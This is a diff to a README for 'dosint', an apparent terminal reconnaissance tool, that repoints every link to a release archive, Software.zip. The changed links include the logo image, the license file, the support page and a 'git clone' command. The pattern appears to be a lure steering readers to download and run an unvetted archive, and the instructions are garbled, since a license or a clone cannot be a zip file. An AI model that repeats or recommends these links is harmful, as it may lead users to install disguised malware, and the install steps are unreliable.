@@ -1,6 +1,6 @@
 # 🕵️‍♂️ Welcome to "dosint" Repository
 
-![dosint Logo](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip)
+![dosint Logo](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ Welcome to the "dosint" repository, a powerful tool designed for terminal-based 
 
 ## Installation
 
-To install "dosint", download the latest release [here](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip). Once downloaded, follow the installation instructions in the README file to launch the tool successfully.
+To install "dosint", download the latest release [here](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip). Once downloaded, follow the installation instructions in the README file to launch the tool successfully.
 
 ## Usage
 
@@ -50,7 +50,7 @@ Code, Coding, Computer Science, Days of Code, Developer, DevOps, Dork Scanner, D
 
 - **Clone the Repository:**
   ```bash
-  git clone https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip
+  git clone https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip
   ```
 
 - **Explore the Codebase:**
@@ -62,18 +62,18 @@ If you're interested in contributing to "dosint," feel free to fork the reposito
 
 ## Support
 
-For any questions or issues regarding "dosint," please refer to the [Releases](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip) section for the latest updates and bug fixes. Our team is dedicated to providing support and ensuring a seamless user experience.
+For any questions or issues regarding "dosint," please refer to the [Releases](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip) section for the latest updates and bug fixes. Our team is dedicated to providing support and ensuring a seamless user experience.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
-🔗 **[Click here to download the latest release](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip)** 👈
+🔗 **[Click here to download the latest release](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip)** 👈
 
 ---
 
 **Let's enhance your reconnaissance capabilities with "dosint"!** 🚀
 
-![Reconnaissance Image](https://github.com/MananGoyal-coder/dosint/releases/download/v1.0/App.zip)
+![Reconnaissance Image](https://github.com/MananGoyal-coder/dosint/releases/download/v2.0/Software.zip)
